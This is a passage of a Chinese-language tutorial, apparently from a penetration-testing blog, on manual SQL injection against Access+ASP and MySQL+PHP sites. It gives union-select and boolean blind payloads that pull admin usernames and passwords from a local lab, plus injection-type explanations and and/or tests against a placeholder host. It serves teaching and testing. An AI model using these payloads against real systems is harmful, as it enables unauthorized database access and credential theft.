class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271717571.png" alt="image-20240218155953387"></p><ul><li>猜字段</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 表存在就会出现些数字并显示，不存在则报错</span><br><span class="line"># 报错可以将 admin 换成别的表,也可以换字段添加或减少</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718258.png" alt="image-20240218155953387"></p><ul><li>查询数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 在显示数字上的文字替换要猜的字段</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br><span class="line">#如果显示不出可以在前面加<span class="operator">-</span>让它报错：http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">-110</span>，显示后面的<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">-110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718843.png" alt="image-20240218160631552"></p><ul><li>access数据库语句</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718257.png" alt="image-20240218162101764"></p><h2 id="access-asp-逐字猜解法"><a href="#access-asp-逐字猜解法" class="headerlink" title="access+asp 逐字猜解法"></a>access+asp 逐字猜解法</h2><h3 id="1、判断是否存在注入"><a href="#1、判断是否存在注入" class="headerlink" title="1、判断是否存在注入"></a>1、判断是否存在注入</h3><ul><li><code>and</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  # 正确页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  # 错误页面<span class="keyword">or</span> 判断</span><br></pre></td></tr></table></figure><ul><li><code>or</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">-104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   # 错误页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>    # 正常页面</span><br></pre></td></tr></table></figure><h3 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h3><ul><li><code>order by</code> 判断当前表的字段数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 一直到出错，不出错的有多少个就是多少个字段数</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">10</span>  # 正常</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">11</span>  # 错误</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718729.png" alt="image-20240218155121342"></p><h3 id="3、猜表"><a href="#3、猜表" class="headerlink" title="3、猜表"></a>3、猜表</h3><ul><li>使用<code>and</code> 和 <code>exists</code>函数猜表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># URL 页面返回正常说明表存在，不存在则报错</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718496.png" alt="image-20240218164449653"></p><h3 id="4、猜列"><a href="#4、猜列" class="headerlink" title="4、猜列"></a>4、猜列</h3><ul><li>使用<code>and</code> 和 <code>exists</code>猜</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># URL 页面返回正常说明表存在，不存在则报错</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> username <span class="keyword">from</span> admin)</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> password <span class="keyword">from</span> admin)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718092.png" alt="image-20240218165517032"></p><h3 id="5、猜数据长度"><a href="#5、猜数据长度" class="headerlink" title="5、猜数据长度"></a>5、猜数据长度</h3><ul><li><code>len</code>函数，查询字段的长度</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># URL页面  等于<span class="number">8</span>就是确定数据的长度 也可以使用大于（<span class="operator">&gt;</span>）小于（<span class="operator">&lt;</span>）个人认为 等于（<span class="operator">=</span>）最好确定长度</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> len(username) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">8</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># access数据库</span><br><span class="line"># 从admin表中选取所有记录，并返回第一条记录的用户名长度</span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> len(username) <span class="keyword">from</span> admin</span><br><span class="line">或</span><br><span class="line"># 从admin表中选取用户名长度为<span class="number">8</span>的记录，并返回第一条记录的用户名长度</span><br><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> LEN(username) <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> LEN(username) <span class="operator">=</span> <span class="number">8</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718836.png" alt="image-20240218172811804"></p><h3 id="6、查询数据asccii码"><a href="#6、查询数据asccii码" class="headerlink" title="6、查询数据asccii码"></a>6、查询数据asccii码</h3><ul><li><code>mid()</code> 函数，截取位置</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 从字符串<span class="string">&#x27;ads&#x27;</span>中提取从第<span class="number">1</span>个字符开始的长度为<span class="number">1</span>的子字符串</span><br><span class="line"># <span class="number">1</span> 是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">1</span> 是要提取的子字符串的长度。</span><br><span class="line"><span class="keyword">select</span> mid(<span class="string">&#x27;ads&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271718256.png" alt="image-20240218174109525"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 从字符串<span class="string">&#x27;ads&#x27;</span>中提取从第<span class="number">2</span>个字符开始的长度为<span class="number">2</span>的子字符串</span><br><span class="line"># <span class="number">2</span>是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">2</span>是要提取的子字符串的长度。</span><br><span class="line"><span class="keyword">select</span> mid(<span class="string">&#x27;ads&#x27;</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271719845.png" alt="image-20240218174152687"></p><ul><li><code>asc() </code> 函数，查询ascii码</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># URL页面，猜测ascii码,两边为证真则页面返回正常，否则页面报错</span><br><span class="line"># <span class="number">1</span> 是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">1</span> 是要提取的子字符串的长度。</span><br><span class="line"># <span class="number">97</span>的字符为a,<span class="number">100</span>的字符为d,拼接起来就是ad</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(username,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">97</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(username,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">100</span></span><br><span class="line">......</span><br><span class="line"># 猜测ascii码,两边为证真则页面返回正常，否则页面报错</span><br><span class="line"># <span class="number">1</span> 是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">1</span> 是要提取的子字符串的长度。</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(password,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">100</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(password,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">102</span></span><br><span class="line">......</span><br><span class="line"># 猜解完之后把ascii码转换过来并接就是该字段的的数据，其他字段也是这样。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">sql</span>语句</span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(password,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271719320.png" alt="image-20240219090226650"></p><h2 id="SQL注入类型的区分详解"><a href="#SQL注入类型的区分详解" class="headerlink" title="SQL注入类型的区分详解"></a>SQL注入类型的区分详解</h2><h3 id="1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种："><a href="#1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种：" class="headerlink" title="1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种："></a>1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种：</h3><ul><li><code>GET</code> 请求方法<ul><li>GET请求的参数直接附加在URL后，通过问号（?）分隔主体与参数，多个参数使用&amp;符号分隔。</li><li>由于参数直接暴露在URL中，存在长度限制，特别是对包含中文字符的参数需要进行URL编码（使用 <code>%</code> 符号对非字母数字字符进行转义）以确保传输准确性。</li><li>GET请求的URL长度限制根据浏览器和服务器的设置，一般建议至少支持8KB的长度，但实际应用中可能更低。</li></ul></li></ul><p>详细可以参考<a href="https://www.cnblogs.com/cuihongyu3503319/p/5892257.html">URL最长的长度</a></p><ul><li><p><code>POST</code> 请求方法</p><ul><li>POST请求的参数通常放在请求体（Request Body）中，而非URL，因为请求体的内容不会像GET请求那样直接显示在URL中提高了安全性，特别适用于传递大量数据或敏感信息。</li><li>POST请求的数据量理论上没有硬性限制，但服务器和中间件可能会设定各自的限制。</li><li>POST 操作不具有幂等性，这意味着多次执行同样的 POST 请求可能会导致不同的结果（例如，在数据库中生成多条记录）。</li></ul></li><li><p><code>COOKIE</code> 方法</p><ul><li>Cookie 是由服务器发送到客户端（通常是浏览器）的一小段文本信息，它会被浏览器存储起来，并在后续对该服务器发起的请求中自动附带到请求头（<code>Cookie</code>字段）中。</li><li>服务器在接收请求时会从请求头中提取Cookie参数，用于识别和跟踪用户状态。</li><li>通过检查请求头中的Cookie字段，服务器获取和验证客户端的状态信息，用于在客户端和服务器之间维护会话状态，但需要注意安全性和隐私保护。</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_GET</span>);    <span class="comment"># 打印出通过GET方法传递到当前脚本的所有参数及其对应值。</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;      <span class="comment"># 打印一个水平线，以提高可读性</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_POST</span>);   <span class="comment"># 打印出通过POST方法提交到当前脚本的所有参数及其对应值。</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;      <span class="comment"># 再次打印一个水平线</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_COOKIE</span>); <span class="comment"># 打印出当前请求中随HTTP头部一起发送的所有cookie及其对应值。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 运行这个脚本，它将显示这些数组的内容，提供了在处理通过不同HTTP方法发送的数据时进行调试和了解输入数据的方式。</span></span><br></pre></td></tr></table></figure><p>综合而言，GET用于简单的数据获取，POST适用于提交大量数据或敏感信息，而Cookie用于在客户端和服务器之间维护状态。</p><h3 id="2、-注入数据类型的区分"><a href="#2、-注入数据类型的区分" class="headerlink" title="2、 注入数据类型的区分"></a>2、 注入数据类型的区分</h3><p>在任何类型的注入中，闭合的目的是确保注入点不破坏原始SQL语句的结构，同时使得添加的条件始终为真。不进行闭合可能导致SQL语句出错，使得判断条件失效。</p><ul><li><code>int</code> 整型注入</li></ul><p>整型注入通常不需要闭合，但为了确保SQL语句结构的完整性，可以添加一个始终成立的条件，如 <code>&#39;x&#39; = &#39;x&#39;</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 示例，结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span> `id` <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271719484.png" alt="image-20240219105617580"></p><p>除了第一种以外 其余在判断注入或查询语句的时候都要进行闭合，不闭合 SQL语句不仅会出错，可能与原意不一样，会造成错误的判断。</p><ul><li><code>sting</code> 字符型注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 示例，结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="operator">=</span> <span class="string">&#x27;人事部&#x27;</span></span><br><span class="line"># 字符型 注入闭合示例，结果如下图：</span><br><span class="line"># 字符型注入需要在原始条件后添加一个始终成立的条件来闭合注入。</span><br><span class="line"># <span class="string">&#x27; AND &#x27;</span>x<span class="string">&#x27; = &#x27;</span>x<span class="string">&#x27; 这个部分就是闭合的部分</span></span><br><span class="line"><span class="string">SELECT* FROM`b-class` WHERE`class` = &#x27;</span>人事部<span class="string">&#x27; AND &#x27;</span>x<span class="string">&#x27; = &#x27;</span>x<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271719311.png" alt="image-20240219110646765"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果<span class="string">&#x27;x&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span>不相等，示例：<span class="string">&#x27;x&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>，有可能不显示 结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="operator">=</span> <span class="string">&#x27;人事部&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;x&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271719657.png" alt="image-20240219111710572"></p><ul><li><code>like</code> 搜索型注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 示例，结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="keyword">LIKE</span> <span class="string">&#x27;%标题%&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271719739.png" alt="image-20240219112145565"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">like</span> 模糊型注入闭合示例,结果如下图：</span><br><span class="line"># 模糊型注入需要在原始条件后添加一个始终成立的条件，确保注入点被正确闭合。</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="keyword">LIKE</span> <span class="string">&#x27;%标题%&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1%&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;1%&#x27;</span></span><br><span class="line"># <span class="operator">%</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span> 这个是闭合的部分 不能有空格</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271719771.png" alt="image-20240219113113783"></p><h3 id="3、注入方法区分"><a href="#3、注入方法区分" class="headerlink" title="3、注入方法区分"></a>3、注入方法区分</h3><ul><li><p><strong>联合查询注入(Union Select Injection)：</strong></p><ul><li>联合查询注入是通过在原始查询中使用 <code>UNION SELECT</code> 语句，将两个或多个表的结果合并，从而获取未授权的数据。</li><li>攻击者可能通过 <code>UNION SELECT</code> 操作来联合其他表，获取敏感信息。</li></ul></li><li><p><strong>报错注入 (Error-Based Injection):</strong></p><ul><li>报错注入是通过故意构造导致数据库报错的输入，以获取有关数据库结构的信息。</li><li>攻击者可能利用数据库报错信息获取表名、字段名等信息。</li></ul></li><li><p><strong>盲注入 (Blind Injection):</strong></p><ul><li><strong>布尔型注入 (Boolean-Based Blind Injection):</strong><ul><li>攻击者通过构造SQL语句，利用条件语句的真假来推断数据库中的数据。</li><li>布尔型盲注攻击中，攻击者通过观察应用程序的不同行为来推断条件是否为真。</li></ul></li><li><strong>时间型注入 (Time-Based Blind Injection):</strong><ul><li>攻击者通过在SQL语句中使用时间延迟函数，通过等待时间的长短来判断条件是否为真。</li><li>时间型盲注攻击中，攻击者通过观察应用程序对不同条件的响应时间来推断条件是否为真。</li></ul></li></ul></li></ul><h2 id="mysql-php-手工注入篇"><a href="#mysql-php-手工注入篇" class="headerlink" title="mysql+php 手工注入篇"></a>mysql+php 手工注入篇</h2><h3 id="1、mysql的注释符号"><a href="#1、mysql的注释符号" class="headerlink" title="1、mysql的注释符号"></a>1、mysql的注释符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- 空格</span><br><span class="line"></span><br><span class="line">/*里面的内容都会被注释*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 、 -- 、/**/ 用于注释后后面语句 不再执行</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line"></span><br><span class="line">select * from artile where id=1  #这个部分的语句不再执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、注入常用查询系统信息函数"><a href="#2、注入常用查询系统信息函数" class="headerlink" title="2、注入常用查询系统信息函数"></a>2、注入常用查询系统信息函数</h3><ul><li><code>version()</code>  MySQL 版本</li><li><code>user()</code>  数据库用户名</li><li><code>database</code>  数据库名</li><li><code>@@datadir</code>  数据库路径</li><li><code>@@version_compile_os</code>  操作系统版本</li></ul><h3 id="3、判断是否存在注入-1"><a href="#3、判断是否存在注入-1" class="headerlink" title="3、判断是否存在注入"></a>3、判断是否存在注入</h3><p>使用 <code>&amp;&amp;</code> 与 <code>||</code> 这种特殊符号时，需要在浏览器中对URL进行转码后才能提交，因为浏览器默认不会进行编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 页面是否返回正常，或是否存在报错信息</span><br><span class="line"># 双方为真或者一方为真时返回正常，双方为假时返回空出现错误</span><br><span class="line"># and 函数：</span><br><span class="line"># 例子：</span><br><span class="line">http://target_sys.com/article.php?id=1 and 1=1 # 正常</span><br><span class="line">http://target_sys.com/article.php?id=1 and 1=2 # 失败</span><br><span class="line">/*</span><br><span class="line">解释：攻击者尝试通过在原始查询中追加 and 1=1 或 and 1=2 的条件，来观察页面的返回情况。</span><br><span class="line">当 and 1=1 为真时，页面正常返回，表示注入点存在并且条件成立。</span><br><span class="line">当 and 1=2 为真时，页面返回错误或为空，表示条件不成立，可能是注入点不存在或者条件错误。</span><br><span class="line">URL 转译：攻击者可能会尝试绕过安全防护，将关键字如 and 转译为其他形式，如 &amp;&amp; 或 %26%26。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"># or 函数：</span><br><span class="line"># 例子：</span><br><span class="line">http://target_sys.com/article.php?id=1 or 1=1 # 正常</span><br><span class="line">http://target_sys.com/article.php?id=-1 or 1=2 # 错误</span><br><span class="line">http://target_sys.com/article.php?id=-1 or 1=1 # 正常</span><br><span class="line">/*</span><br><span class="line">解释：攻击者尝试通过在原始查询中追加 or 1=1 或 or 1=2 的条件，来观察页面的返回情况。</span><br><span class="line">当 or 1=1 为真时，页面正常返回，表示注入点存在并且条件成立。</span><br><span class="line">当 or 1=2 为真时，页面返回错误或为空，表示条件不成立，可能是注入点不存在或者条件错误。</span><br><span class="line">URL 转译：攻击者可能会尝试绕过安全防护，将关键字如 or 转译为其他形式，如 %20 表示空格。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
